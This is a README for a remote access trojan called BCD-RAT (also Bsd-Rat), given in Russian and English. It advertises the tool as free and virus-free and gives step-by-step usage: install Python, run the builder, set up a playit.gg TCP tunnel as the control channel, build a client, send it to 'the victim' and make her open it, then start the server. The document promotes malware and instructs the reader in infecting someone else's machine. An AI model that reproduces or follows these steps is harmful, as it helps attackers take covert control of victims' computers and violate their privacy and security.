#####################################################################
#  ,-----.   ,-----.,------.         ,------.   ,---. ,--------.    #
#  |  |) /_ '  .--./|  .-.  \ ,-----.|  .--. ' /  O  \'--.  .--'    #
#  |  .-.  \|  |    |  |  \  :'-----'|  '--'.'|  .-.  |  |  |       #
#  |  '--' /'  '--'\|  '--'  /       |  |\  \ |  | |  |  |  |       #
#  `------'  `-----'`-------'        `--' '--'`--' `--'  `--'       #
#####################################################################
#                 Thank you for using BCD-RAT                       #
#####################################################################

1) We are the best in this business!
2) There is not a single virus in the code!
3) The code was written exclusively by us!
4) You can use this program absolutely free of charge!
5) If you want something more, you can buy the program on the official website!
------------------------------------------------------------------------------------
Developer: Lavrentime
Site: https://futmelolmen-source.github.io/Darker-Rat

------------------------------------------------------------------------------------

Русский:
Устонави python по ссылке https://www.python.org/ftp/python/3.13.9/python-3.13.9-amd64.exe (при установки не забудь нажать add path)
-------------------------------------------------------------------------------------------------------------------------------------
1) загрузи библиотеки с помощью Intsall-Library.py
2) запусти Bsd-Rat.pyw
3) открой playit.gg, зарегестрируйся и создай tcp server
4) настрой параметры сервера и создай клиент с помощью билдера в Bsd-Rat.pyw
5) кинь его жертве и сделай так чтобы она его открыла
6) открой Bsd-Rat.pyw и нажми запустить сервер
7) пользуйся функциями Bsd-Rat и посети сайт https://futmelolmen-source.github.io/Darker-Rat
---------------------------------------------------------------------------------

English:
Install python from the link https://www.python.org/ftp/python/3.13.9/python-3.13.9-amd64.exe (don't forget to click "Add Path" during installation)
-------------------------------------------------------------------------------------------------------------------------------------
1) download the libraries using Intsall-Library.py
2) run Bsd-Rat.pyw
3) Open its playit.gg, register and create a bridge
4) configure the bridge settings and create a client using the Bsd-Rat.pyw constructor
5) Throw it to the victim and force her to open it
6) open Bsd-Rat.pyw and click "Start server"
7) Use the Bsd-Rat functions and visit the https://futmelolmen-source.github.io/Darker-Rat
----------------------------------------------------------------------